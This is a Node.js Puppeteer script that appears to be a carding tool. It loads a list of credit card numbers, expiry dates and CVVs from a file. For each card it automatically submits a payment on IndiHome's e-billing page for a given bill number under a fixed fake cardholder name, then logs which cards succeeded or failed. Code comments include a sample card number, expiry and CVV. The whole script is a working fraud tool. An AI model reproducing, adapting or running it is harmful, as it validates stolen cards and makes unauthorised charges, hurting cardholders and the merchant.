const readlineSync = require('readline-sync');
const puppeteer = require('puppeteer');
const fs = require('fs');
const delay = require('delay');
var no = 1;
(async () => {
    var aww = readlineSync.question('Input File CC : ');
    var bill = readlineSync.question('Billing Number : ');
    console.log('\n');
    const read = fs.readFileSync(aww, 'UTF-8');
    const list = read.split(/\r?\n/);
    for (var i = 0; i < list.length; i++) {
        var name = 'Paman James';
        var getyear = list[i].split('|')[2];
        var year = (getyear.length == 4) ? getyear.slice(getyear.length - 2) : getyear;
        var cardnum = list[i].split('|')[0]; //5115580711743767
        var cardexpire = list[i].split('|')[1]+year; //1022
        var cardcvv = list[i].split('|')[3]; //826

        const $options = { waitUntil: 'networkidle2' };
        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();

        await page.goto('https://www.indihome.co.id/ebilling-paynow?billnum='+bill+'', $options);
        await page.waitForSelector('button[id=btn-continue]', { visible: false, timeout: 0 });
        
        const btnSubmit = await page.$('button[id=btn-continue]')
        await btnSubmit.click()
        await btnSubmit.dispose()
        await page.waitForNavigation()

        const nameField = await page.$('input[name=fin_cardname]');
        await nameField.type(name)
        await nameField.dispose()

        const numberField = await page.$('input[name=fin_cardno]');
        await numberField.type(cardnum)
        await numberField.dispose()

        const expireField = await page.$('input[id=expiry]');
        await expireField.type(cardexpire)
        await expireField.dispose()

        const cvvField = await page.$('input[id=cvc]');
        await cvvField.type(cardcvv)
        await cvvField.dispose()
        const inputSubmit = await page.$('input[id=submit-btn]')
        await inputSubmit.click()
        await inputSubmit.dispose()
        await page.waitForNavigation()

        if (page.url().includes('https://indihome.co.id/ebilling-paynow/callback-gagal-transaksi')) {
            console.log("[Gagal Pay] ", '[' + no + ']' + ' ' + cardnum + '|' + cardexpire + '|' + cardcvv);
            no++;
        } else {
            console.log("[Berhasil Pay] ", '[' + no + ']' + ' ' + cardnum + '|' + cardexpire + '|' + cardcvv);
        }

        await browser.close();
    }
})();
